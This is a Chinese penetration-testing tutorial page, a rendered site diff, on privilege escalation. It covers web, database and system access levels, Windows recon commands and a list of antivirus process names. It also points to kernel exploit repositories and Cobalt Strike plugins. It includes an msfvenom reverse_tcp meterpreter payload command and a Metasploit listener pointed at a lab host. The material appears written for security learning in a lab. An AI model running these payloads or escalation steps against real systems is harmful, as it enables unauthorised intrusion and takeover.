+      <a href="../../%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%8C%96%E7%9F%BFXMR%E5%B8%81%20%E7%A8%8B%E5%BA%8F%EF%BC%88%E7%97%85%E6%AF%92%EF%BC%89%E5%8F%91%E7%8E%B0%E4%B8%8E%E6%B8%85%E9%99%A4/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    挖矿XMR币程序（病毒）发现与清除
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    永恒之蓝(ms_017)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86isecure%20center%20%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    海康威视isecure center综合安防管理平台存在任意文件上传漏洞
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%94%A8%E5%8F%8B-NC-Cloud%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    用友-NC-Cloud远程代码执行
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%A5%9ESecGate3600%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    网神SecGate3600 文件上传
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    网络协议分析
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            网络协议分析
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/HTTPS%20%20TLSv1.3/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTTPS && HTTPS 协议分析
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      权限说明
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      权限提升后操作
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      权限提升的意义
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      权限提升整体流程
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      权限获取方式
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="权限获取方式">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      特殊类型权限获取流程
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      普通类型权限获取流程
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+<h1 id="_1">权限提升介绍<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<p>这里需要我们了解的权限提升大概分为：后台权限，网站权限，数据本权限。接口权限，系统权限。域控权限等。</p>
+<h2 id="_2">权限说明<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<ul>
+<li>后台权限:SQL注入,致据库备份泄露，默认或弱口令等获取帐号密码进入。</li>
+<li>网站权限:后台提升至网站权限，RCE或文件操作类、反序列化等漏洞直达shell。</li>
+<li>数据库权限:SQL注入数据库备份泄露。默认或弱口令等进入或网站权限获取后转入。</li>
+<li>接口权限:SQL注入,数据库备份泄露，源码泄漏，配置不当等或网站权限获取后转入。</li>
+<li>系统权限:高危系统漏洞直达或网站权限提升转入、数据库权限提升转入。第三方转入等。</li>
+<li>域控权限:高危系统漏洞直达或内网横向渗透转入，域控其他服务安全转入等。</li>
+</ul>
+<h2 id="_3">权限提升后操作<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>需要我们了解权限提升后能够做什么事情，这里针对不同的权限，能够做的事情也是不同的。</p>
+<ul>
+<li>后台权限：常规WEB界面文章分类等操作,后台功能可操作类。</li>
+<li>网站权限:查看或修改程序源代码，可以进行网站或应用的配置文件读取（接口配置信息，数据库配置信息等)，还能收集服务器操作系统相关的信息，为后续系统提权做准备。</li>
+<li>数据库权限:操作数据库的权限，数据库的增删改等，源码或配置文件泄漏，也可能是网站权限(webshell)进行的数据库配詈文件读取获得。也可以作为提升系统权限手段。</li>
+<li>接口权限:后台或网站权限后的获取途径:后台（修改配置信息功能点)，网站权限(查看的配置文件获取)，具体可以操作的事情大家自己想想。</li>
+<li>系统权限:如同在你自己操作自己的电脑一样。</li>
+<li>域控权限:如同在你自己操作自己的虚拟机一样。</li>
+</ul>
+<h2 id="_4">权限提升的意义<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p>这里的意义就是实现你想要达到的效果，例如当你获取到一个服务器后，你想要开启远程桌面，但是你的权限不够，那么你就需要对你的权限进行提示，以便实现开启远程桌面的能力，这就是权限提示的意义。</p>
+<p>同时后期也需要经常使用到权限提升，当然权限提升前提就需要得到一个主机。</p>
+<h2 id="_5">权限提升整体流程<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<p>后台权限&gt;web权限&gt;系统权限&gt;域控权限</p>
+<p>这里简要说一下，首先需要获取到后台权限，然后获取到web权限，这里的web权限也就是获取到网站的权限，其次，当获取到web权限后通过一系列方式获取到系统权限，而域控权限，可能在部分网络结构中没有域控的概念，那么当你获取到系统权限后，基本上就结束了，但是可能在有些网络结构中比较关注域控，那么你还需要进一步的去获取域控权限。</p>
+<h2 id="_6">权限获取方式<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<p>通常来说，不同的权限对应的获取方式也不同，当然也有部分权限获取的方式是一样的。同时在权限获取的时候有些权限获取是不确定在流程中哪一步中获取到的，比如接口权限、数据库权限、</p>
+<h3 id="_7">特殊类型权限获取流程<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
+<p>这里的特殊类型的权限获取，主要就说的是接口权限、数据库权限这类的获取，通常像后台权限、web权限获取都是有流程性的，而且这类是没有流程性的，例如：</p>
+<ul>
+<li>数据库权限：数据库权限可能在获取后台之前就获取到了，比如，通过扫描开放的端口，然后使用弱口令进去了，这种情况就属于在后台权限获取之前，而如果是通过sql注入获取到账号密码，那么就是在后台之后，所以说不定。</li>
+<li>接口权限：基本上也是这样的，可能在之前就获取了，也有可能在之后获取。</li>
+</ul>
+<h3 id="_8">普通类型权限获取流程<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
+<p>平台类型权限获取，就是通常来说，都是这样的进行获取的，通常来说，不是必然.......</p>
+<ul>
+<li>后台权限获取方式：弱口令、sql注入、数据泄露等。</li>
+<li>web权限获取方式：插件应用、数据库、中间件、网站源码后台获取。</li>
+<li>系统权限获取方式(Windows)：溢出漏洞、数据库、第三方软件等。</li>
+</ul>
+<h1 id="_9">中间件语言类权限差异<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h1>
+<h2 id="_10">常见的语言<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h2>
+<h3 id="jsp">JSP权限<a class="headerlink" href="#jsp" title="Permanent link">&para;</a></h3>
+<p>这里我们执行一个id后，显示的是root权限，如果想了解id这个命令是什么意思，可以去学一下Linux系统权限。这里网站是由jsp搭建的，这里需要注意jsp、java搭建的站点在连接上去后都是管理员权限，这是特性，不需要提权，直接就是系统权限。</p>
+<p><img alt="" src="https://s2.loli.net/2023/03/14/TRmofKAr3cyb2eP.png#alt=image-20230314200032658" /></p>
+<h3 id="php">PHP权限<a class="headerlink" href="#php" title="Permanent link">&para;</a></h3>
+<h4 id="linuxphp">Linux中PHP权限<a class="headerlink" href="#linuxphp" title="Permanent link">&para;</a></h4>
+<p>这里执行完是一个普通账户权限，并非是root权限，而这里是一步一步搭建的，就会按照软件上自己配置设定的权限。而这里的权限就只是一个普通用户权限，无法查询其它的内容，只能查看当前软件产生的目录也就是网站目录。</p>
+<p><img alt="" src="https://s2.loli.net/2023/03/14/Vpbkq6ejzXBsGgF.png#alt=image-20230314200512573" /></p>
+<h4 id="windowsphp">Windows中PHP权限<a class="headerlink" href="#windowsphp" title="Permanent link">&para;</a></h4>
+<p>这里同样也是一个普通账户权限，并非是Windows系统中最高权限，这里需要注意，如果是直接使用类似phpstudy这个集成环境搭建的网站就会继承搭建人的权限。</p>
+<p>而这里想看什么就能看什么内容，因为权限够的，相当于就是本地管理员权限。</p>
+<p><img alt="" src="https://s2.loli.net/2023/03/14/YGmDMybAj4dBnpr.png#alt=image-20230314200600654" /></p>
+<h3 id="asp">ASP权限<a class="headerlink" href="#asp" title="Permanent link">&para;</a></h3>
+<p>这里获取到的权限是网络服务权限，也并非是Windows系统中最高权限，这里也是需要提权的。</p>
+<p><img alt="" src="https://s2.loli.net/2023/03/14/GtWRI9yom3BHLVv.png#alt=image-20230314200837852" /></p>
+<h3 id="aspx">ASPX权限<a class="headerlink" href="#aspx" title="Permanent link">&para;</a></h3>
+<p>同样这里获取到的权限是网络服务权限，也并非是Windows系统中最高权限，这里也是需要提权的。</p>
+<p><img alt="" src="https://s2.loli.net/2023/03/14/RTBkL2Q7z6W4KZn.png#alt=image-20230314201217779" /></p>
+<h2 id="_11">权限划分<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h2>
+<h3 id="linux">Linux<a class="headerlink" href="#linux" title="Permanent link">&para;</a></h3>
+<p>管理员UID为0：系统管理员。</p>
+<p>系统用户UID为1-999：Linux中设置的系统用户。</p>
+<p>普通用户UID为1000开始：由管理员创建用于日常工作的用户。</p>
+<h3 id="windows">Windows<a class="headerlink" href="#windows" title="Permanent link">&para;</a></h3>
+<p>用户及用户组：system、Administrator、user、guest等。</p>
+<h2 id="_12">注意点<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h2>
+<p>这里不代表名称不是root或者administrator就不是管理权限，因为在这些系统中会存在一些组的原因，当管理员把账户添加进入管理员组中，那么就能够执行管理员权限。</p>
+<p>同时在Linux中是没预留账户，直接会给你root账户，而Windows系统中只会给你一个administrator权限，Windows系统会预留一个system账户，这个账户和Linux中root账户是一样的都是最高权限。</p>
+<p>所以在后面的权限提升的时候，我们都需要讲账户提升至最高权限才能想干嘛干嘛。</p>
+<h1 id="web">后台权限与web权限提升<a class="headerlink" href="#web" title="Permanent link">&para;</a></h1>
+<p>关于这里不会过多的赘述，因为在web漏洞方面都已经提到过了，不过都需要文件上传或者进行代码执行，讲shell写入，如果这个都过不去，那么后续的提升肯定是困难的，甚至直接就是无法操作。</p>
+<p>当然也有一些网站后台功能点少，没有办法进行shell，那么也同样，确实无法获取权限。</p>
+<h2 id="_13">后台权限提升<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h2>
+<p>关于后台权限提升这里，多数都是通过弱口令，或者sql注入获取，这里我就不赘述了，这类也是最基础的，同时也的最需要破解的，通常来说，如果破解不了后台就很难获取web权限。</p>
+<p>当然不是说只有获取后台权限才能获取web权限，也可以通过web权限获取后台权限，不过这类都需要基于类似先获取数据库权限才能够进行操作。</p>
+<p>当然遇到一个程序如果无思路，可以通过先搜索相关的程序名称拿shell的资料，网上一般有很多这里的操作。</p>
+<h2 id="web_1">web权限提升<a class="headerlink" href="#web_1" title="Permanent link">&para;</a></h2>
+<p>关于web权限提升方式，可以通过之前学过的，例如数据库备份泄露、账户密码、中间件漏洞、cms源码漏洞等均可以获取web权限，包括暴力破解等，都可以对web的权限进行提升，简单来说，web权限提升其实就是获取网站管理权限。</p>
+<p>web权限提升获取，其实还是有很多方式的，这里只是一些常见的方式，如果还是没有思路，最简单的方式就是搜资料！！搜资料！！搜资料！！</p>
+<p>当然web权限提升不单单可以通过这些方式，还可以通过数据库弱口令获取到数据库密码，例如在部分网站中会存在phpmyadmin的数据库管理平台，网上有很多这个平台获取权限的方式，这里就不说了，当获取到这个权限后，那么就可以写入shell，通过webshell管理软件连接上去，翻目录通常就能找到后台密码。</p>
+<p>这里多数就是实现数据库权限提升到web权限提升的跨域。</p>
+<p><img alt="" src="https://s2.loli.net/2023/03/14/AjzLmloqSxYBZyd.png#alt=image-20230314204912738" /></p>
+<p>但是这里不单单只有数据库权限跨域到web权限，也会存在web权限跨域到数据库权限。那么web权限也可以通过第三方插件或者第三方软件的漏洞获取web权限，然后通过连接shell，然后在网站目录中寻找源码，通常就能够寻找到数据库的账户密码。</p>
+<p><img alt="" src="https://s2.loli.net/2023/03/14/S1LEWj6ADgTHwcy.png#alt=image-20230314205437593" /></p>
+<h1 id="windows_1">Windows提权<a class="headerlink" href="#windows_1" title="Permanent link">&para;</a></h1>
+<p>Windows提权大概有三个方向：溢出提权、数据库提权、第三方软件提权、错误的系统配置提权、组策略首选项提权、窃取令牌提权、bypassuac提权，第三方软件/服务提权，WEB中间件漏洞提权等。</p>
+<p>如果遇到无法执行命令的话，可以试着上传cmd.exe文件之可执行的目录下。</p>
+<h2 id="windows_2">Windows提权常见步骤<a class="headerlink" href="#windows_2" title="Permanent link">&para;</a></h2>
+<h3 id="_14">信息收集<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h3>
+<p>信息收集》操作系统版本》系统位数》漏洞补丁》杀软防护》网络》当前权限等信息。</p>
+<h4 id="_15">常见命令<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>systeminfo  查询系统信息
+hostname    主机名
+net user    查看用户信息
+netstat -ano|find &quot;3389&quot;   查看服务pid号
+wmic os get caption        查看系统名
+wmic qfe get Description,HotFixID,InstalledOn   查看补丁信息
+wmic product get name,version   查看当前安装程序
+wmic service list brief   查询本机服务
+wmic process list brief   查询本机进程
+net share   查看本机共享列表
+netsh firewall show config  查看防火墙配置
+</code></pre></div>
+<h4 id="_16">常见杀软程序名称<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>360sd.exe     360杀毒
+360tray.exe   360实时保护
+ZhuDongFangYu.exe   360主动防御
+KSafeTray.exe 金山卫士
+SafeDogUpdateCenter.exe   安全狗
+McAfee McShield.exe   McAfee
+egui.exe    NOD32
+AVP.exe     卡巴斯基
+avguard.exe  小红伞
+bdagent.exe  BitDefender
+RavMonD.exe  瑞星杀毒
+QQPCRTP.exe  QQ电脑管家
+hipstray.exe 火绒杀毒
+</code></pre></div>
+<h2 id="_17">溢出提权<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h2>
+<p>基于补丁》系统版本》位数来筛选可用溢出漏洞EXP。</p>
+<h3 id="_18">溢出提权介绍<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h3>
+<p>此提权方法是利用系统本身存在的一些系统内核溢出漏洞，但未曾打相应的补丁，攻击者通过对比systeminfo信息中的补丁信息来查找缺失的补丁号，通过缺失补丁号对照相应的系统版本查找对应可以提权提升的exp。</p>
+<p>不过这里需要注意，只要对应的补丁号加上对应的系统的版本的提权exp才可以成功，有时候如果查找到提权exp提权不成功，那么就可以查看是不是系统版本没对应上，且不排除一些提权漏洞利用需要相应的环境。</p>
+<p>这里使用Windows10，同时基于已经拿到基础权限，并且通过文件上传连接到Windows10系统上了。</p>
+<h3 id="_19">溢出提权三种方式<a class="headerlink" href="#_19" title="Permanent link">&para;</a></h3>
+<ul>
+<li>手动提权：手动提权就是基于自己去搜集相关的补丁，然后进行提权。</li>
+<li>CS半自动化提权：上传木马，然后通过一下插件实现半自动化提权。</li>
+<li>MSF全自动提权：MSF就是通过内置的一些功能，实现全自动提权。</li>
+</ul>
+<h2 id="_20">手动溢出提权<a class="headerlink" href="#_20" title="Permanent link">&para;</a></h2>
+<p>关于手动提权这里只能大致说一下整体的提权流程，关于演示，由于环境原因，确实不好进行演示，而且在提权中，不代表找到相应的EXP就一定能够提权成功，在提权过程中可能会遇到很多的困难解决不好，最关键的就是杀毒软件。</p>
+<h3 id="_21">上线<a class="headerlink" href="#_21" title="Permanent link">&para;</a></h3>
+<p>这里通过文件上传已经将一句话木马连接上去，并且用户只是一个普通用户，这里的admin是我自己设置的，我们提权需要提到system权限才可以执行我们想要的任何操作。</p>
+<p><img alt="" src="https://s2.loli.net/2023/03/15/49GvUDuaPSEAeM1.png#alt=image-20230315203725996" /></p>
+<h3 id="_22">信息收集<a class="headerlink" href="#_22" title="Permanent link">&para;</a></h3>
+<h4 id="_23">查找补丁信息及版本信息<a class="headerlink" href="#_23" title="Permanent link">&para;</a></h4>
+<p>通过信息收集我们获取到，该系统是一个Windows10 专业版，其实这里就已经将打的补丁显示出来了，只是这里并未进行补丁修补而已，所以没有记录。</p>
+<p><img alt="" src="https://s2.loli.net/2023/03/15/PEc3g9nlewj2BvM.png#alt=image-20230315203956641" /></p>
+<h4 id="_24">查询杀软信息<a class="headerlink" href="#_24" title="Permanent link">&para;</a></h4>
+<p>查看是否存在杀软，也就是运行软件中，看看是否存在相关的杀毒软件，这里我们查询后发现，并没杀毒软件，不过需要注意的是，正常情况下那台服务器没有杀毒软件，而且部分杀毒软件还能够自动识别是否在执行提权操作。</p>
+<p><img alt="" src="https://s2.loli.net/2023/03/15/1o7KfUzqIu9RNWS.png#alt=image-20230315204329350" /></p>
+<p>上面是通过手动比较来进行查看是否存在杀软，这里采用在线的杀软比较，确实不存在杀软。</p>
+<p>在线杀软查询：<a href="https://i.hacking8.com/tiquan/">https://i.hacking8.com/tiquan/</a></p>
+<p><img alt="" src="https://s2.loli.net/2023/03/15/YkBvMXwuG4OsWLE.png#alt=image-20230315205507322" /></p>
+<h4 id="exp">自动提权可利用EXP编号<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h4>
+<p>这里寻找可利用的exp，注意这里我本地安装的虚拟机我找了好几个都是没有安装任何补丁的，所以提交上去显示也是无法进行比较的。这里就把整个流程都说一下吧，一般情况下手动提权还是比较困难的，而且比较费事。</p>
+<p>在进行提权辅助的时候，需要将下面的远程代码执行取消，由于我们只需要进行权限提升，所以我们只查询权限提升的方式，其它的我们不管。</p>
+<p>提权EXP识别平台：<a href="https://i.hacking8.com/tiquan/">https://i.hacking8.com/tiquan/</a></p>
+<p>python工具识别：<a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></p>
+<p><img alt="" src="https://s2.loli.net/2023/03/15/I6iTOwfc2JMGeRj.png#alt=image-20230315210349452" /></p>
+<p>当查询相关的可进行权限提升的编号后，会在页面的下发显示出相应的编号，任何去寻找相应的编号的EXP即可。</p>
+<p><img alt="" src="https://s2.loli.net/2023/03/15/jztf8pydFDsBiu4.png#alt=image-20230315210328714" /></p>
+<h3 id="exp_1">寻找EXP<a class="headerlink" href="#exp_1" title="Permanent link">&para;</a></h3>
+<p>寻找EXP是寻找通过之前补丁识别出来的可利用的EXP编号，通过寻找到的EXP然后进行利用，这里我本地也是也不好演示，所以就不演示了，正常相应的EXP找到后，都会存在利用方式的，并且通过截图演示，也看不出效果。</p>
+<p>这里还需要注意，寻找到的EXP不代表就一定能够提权成功，因为你不知道编写EXP的人的测试环境是什么情况，比如人家在Windows10 2022H1上能够成功，但是你在2022H2上不一定能够成功，虽然都没安装补丁，但是就会出现这种，提权不了的情况。</p>
+<p>下面列举几个寻找EXP的地址。</p>
+<p><a href="https://github.com/Ascotbe/Kernelhub/tree/master/Windows">https://github.com/Ascotbe/Kernelhub/tree/master/Windows</a></p>
+<p><a href="https://github.com/lyshark/Windows-exploits">https://github.com/lyshark/Windows-exploits</a></p>
+<p><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
+<p><a href="https://github.com/klsfct/getshell">https://github.com/klsfct/getshell</a></p>
+<p>比如这里上面的截图的CVE-2021-1732的EXP，以及在页面的下方都列举出利用的方式。</p>
+<p><img alt="" src="https://s2.loli.net/2023/03/15/xGY3JFjQIqVlhvD.png#alt=image-20230315212259940" /></p>
+<p>当然如果说寻找到EXP编号后，在这些地址中并没有可利用的exp信息，那么可以直接在github上搜索即可，可以看到搜索后显示出很多的EXP都可以进行测试。</p>
+<p><img alt="" src="https://s2.loli.net/2023/03/15/CEtGhJjVc1xLbaW.png#alt=image-20230315212752058" /></p>
+<h3 id="exp_2">提权EXP运行方式<a class="headerlink" href="#exp_2" title="Permanent link">&para;</a></h3>
+<ul>
+<li>直接执行exe程序，成功后会打开一个cmd窗口，在新窗口中权限就是system</li>
+<li>在WebShell中执行exe程序，执行方式为xx.exe whoami，成功后直接执行命令，再修改命令内容，可以执行不同的命令</li>
+<li>利用MSF等工具</li>
+<li>C++源码，Python脚本，PowerShell脚本等特殊方式</li>
+</ul>
+<h2 id="cs">CS半自动化溢出提权<a class="headerlink" href="#cs" title="Permanent link">&para;</a></h2>
+<p>CS半自动提权，简单来说就是当你把文件上传上去后，然后通过CS生成一个后门，将后门上传至服务器中，再使用CS上安装的各类插件来进行半自动化提权。</p>
+<p>这里可能不单单使用的是溢出提权，还有可能使用的是其它的提权方式。</p>
+<p>这里使用的是Windows2012环境。</p>
+<p>CS工具介绍：<a href="https://blog.csdn.net/weixin_44268918/article/details/128857998?spm=1001.2014.3001.5501">https://blog.csdn.net/weixin_44268918/article/details/128857998?spm=1001.2014.3001.5501</a></p>
+<h3 id="_25">上线<a class="headerlink" href="#_25" title="Permanent link">&para;</a></h3>
+<p>这里通过CS生成木马上传，并执行，通常来说通过文件上传获取到的权限都比较低，所以在运行木马的时候，也都是普通权限运行，导致木马也就是普通权限，只有当使用管理员启动，才是基本的管理员权限。</p>
+<p>这里不用太在意我这个上线就是administrator权限，我们主要目标就是system的权限。</p>
+<p><img alt="" src="https://s2.loli.net/2023/03/16/cAanj8Hf5LWqEF7.png#alt=image-20230316092046007" /></p>
+<h3 id="_26">提权插件<a class="headerlink" href="#_26" title="Permanent link">&para;</a></h3>
+<p>这里推荐几个提权插件，这些插件都是经过测试的，像之前手动提权，多多少少存在编写EXP人的和你的环境不同，可能就导致别人能够提权成功，而你无法提权成功的情况。</p>
+<p>这些插件都集成了很多的功能，原版CS上的功能很少，基本上就是一个类似MSF的一个图像化工具，当装上插件后，就可以使得CS摇身一变，变成内网大杀器。</p>
+<p>梼杌：<a href="https://github.com/pandasec888/taowu-cobalt-strike">https://github.com/pandasec888/taowu-cobalt-strike</a></p>
+<p>ladon：<a href="https://github.com/k8gege/Aggressor">https://github.com/k8gege/Aggressor</a></p>
+<p><img alt="" src="https://s2.loli.net/2023/03/16/TXsFH3Ow8n9yuZR.png#alt=image-20230316092109387" /></p>
+<h3 id="_27">当前权限<a class="headerlink" href="#_27" title="Permanent link">&para;</a></h3>
+<p>通过输入命令查看，当前权限就是一个普通权限，虽然可能能够执行一些管理员的操作，但是我们需要的是将权限提升到system，这样我们想执行什么命令就能够执行什么命令。</p>
+<p><img alt="" src="https://s2.loli.net/2023/03/16/RqHz3rQCs4txZPu.png#alt=image-20230316092139053" /></p>
+<h3 id="_28">提权操作<a class="headerlink" href="#_28" title="Permanent link">&para;</a></h3>
+<h4 id="_29">选择提权方式<a class="headerlink" href="#_29" title="Permanent link">&para;</a></h4>
+<p>这里使用梼杌进行提权，选择sweetpotato，然后继续提权。</p>
+<p><img alt="" src="https://s2.loli.net/2023/03/16/Q2prUXwxPJksOKc.png#alt=image-20230316092405248" /></p>
+<h4 id="_30">提权成功<a class="headerlink" href="#_30" title="Permanent link">&para;</a></h4>
+<p>可以看到这里弹出一个system的权限连接，即证明提权成功，当然这里不代表任何一个提权都能够成功的，有些提权方式可能会由于操作系统的不同，导致失败，这里我选择sweetpotato进行提权就是的，前面几个都提权失败了，有不成功的，有系统不匹配的，所以多试试，当然也可以安装更多的插件，使用不同插件中的不同的提权方式，总之多试试。</p>
+<p><img alt="" src="https://s2.loli.net/2023/03/16/pdxObCLtYvhy9Zs.png#alt=image-20230316092835343" /></p>
+<h2 id="msf">MSF全自动溢出提权<a class="headerlink" href="#msf" title="Permanent link">&para;</a></h2>
+<p>如果对MSF工具不熟悉的可以参考以下的连接进行学习，这个只是上篇，在博客主页中能够找到下篇。这里使用的环境是Windows7，由于Windows2012上没有补丁信息，就会导致无法识别的情况。</p>
+<p>MSF工具使用：<a href="https://blog.csdn.net/weixin_44268918/article/details/128775978?spm=1001.2014.3001.5501">https://blog.csdn.net/weixin_44268918/article/details/128775978?spm=1001.2014.3001.5501</a></p>
+<h3 id="_31">监听操作<a class="headerlink" href="#_31" title="Permanent link">&para;</a></h3>
+<h4 id="_32">生成木马<a class="headerlink" href="#_32" title="Permanent link">&para;</a></h4>
+<p>通过msfvenom生成一个木马，然后将木马上传至服务器中，即可。</p>
+<div class="highlight"><pre><span></span><code>命令：msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.20 LPORT=3333 -f exe -o msf.exe
+LHOST=kali地址
+LPORT=自定义设置一个端口
+</code></pre></div>
+<p><img alt="" src="https://s2.loli.net/2023/03/16/botig5j21eJkNqD.png#alt=image-20230316094456638" /></p>
+<h4 id="_33">监听木马<a class="headerlink" href="#_33" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>msf6 &gt; use exploit/multi/handler    
+[*] Using configured payload generic/shell_reverse_tcp   
+msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp    ##配置监听TCP
+payload =&gt; windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) &gt; set lport 3333    ##配置监听端口
+lport =&gt; 3333
+msf6 exploit(multi/handler) &gt; set lhost 0.0.0.0  ##配置监听地址，你也可以设置监听本机地址如192.168.10.20
+lhost =&gt; 0.0.0.0
+msf6 exploit(multi/handler) &gt; run  ##开始监听
+</code></pre></div>
+<p><img alt="" src="https://s2.loli.net/2023/03/16/Wmuj7D1NqY635x4.png#alt=image-20230316095121748" /></p>
+<h4 id="_34">上线<a class="headerlink" href="#_34" title="Permanent link">&para;</a></h4>
+<p>当讲木马上传后，然后进行运行，即可在kali中显示上线选项，并自动反弹会话窗口，可以看到这里监听到192.168.10.150上线。</p>
+<p><img alt="" src="https://s2.loli.net/2023/03/16/DypGgncmQzSk6uT.png#alt=image-20230316101217168" /></p>
+<h4 id="_35">查看权限<a class="headerlink" href="#_35" title="Permanent link">&para;</a></h4>
+<p>这里还是一样的获取到的权限是administrator，由于演示麻烦，未直接从webshell上执行，所以才会出现administrator的权限，但是不用管，我们需要的是将权限提升到system。</p>
+<p><img alt="" src="https://s2.loli.net/2023/03/16/9RlpJZ35WMknQT6.png#alt=image-20230316101235198" /></p>
+<h3 id="_36">半自动化提权操作<a class="headerlink" href="#_36" title="Permanent link">&para;</a></h3>
+<h4 id="_37">提权模块<a class="headerlink" href="#_37" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>use post/windows/gather/enum_patches 半自动：根据漏洞编号找出系统中安装的补丁
+</code></pre></div>
+<h4 id="_38">操作设置<a class="headerlink" href="#_38" title="Permanent link">&para;</a></h4>
